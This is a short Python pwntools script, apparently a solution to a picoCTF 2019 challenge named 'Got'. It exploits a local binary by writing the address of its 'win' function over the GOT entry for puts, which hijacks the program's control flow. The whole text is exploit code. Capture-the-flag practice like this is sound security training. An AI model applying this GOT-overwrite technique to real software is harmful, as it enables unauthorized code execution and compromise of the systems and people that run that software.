from pwn import *


binary_path = "/home/yuvaly0/Desktop/pico2019/Got/vuln"

e = ELF(binary_path)

puts_got_address = e.got['puts']
win_function_address = e.symbols['win']


log.info('puts got address: {}'.format(hex(puts_got_address)))
log.info('win function address: {}'.format(hex(win_function_address)))

proc = process(binary_path)
proc.sendlineafter("Input address", str(puts_got_address))
proc.sendlineafter("Input value?", str(win_function_address))

print proc.recvall()
